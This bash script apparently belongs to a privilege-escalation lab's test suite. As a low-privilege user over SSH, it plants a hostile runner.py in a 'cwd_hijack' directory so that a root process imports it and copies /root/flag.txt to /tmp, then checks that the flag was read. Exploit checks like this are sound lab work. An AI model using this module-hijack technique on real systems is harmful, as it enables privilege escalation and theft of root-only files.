#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
cat >/home/lowpriv/cwd_hijack/runner.py <<'"'"'EOF'"'"'
open("/tmp/cwdflag","w").write(open("/root/flag.txt").read())
EOF
for _ in $(seq 1 30); do
  if [ -r /tmp/cwdflag ]; then
    cat /tmp/cwdflag
    exit 0
  fi
  sleep 1
done
echo "cwd runner was not imported by root" >&2
exit 1
')"
assert_root_output "${out}"
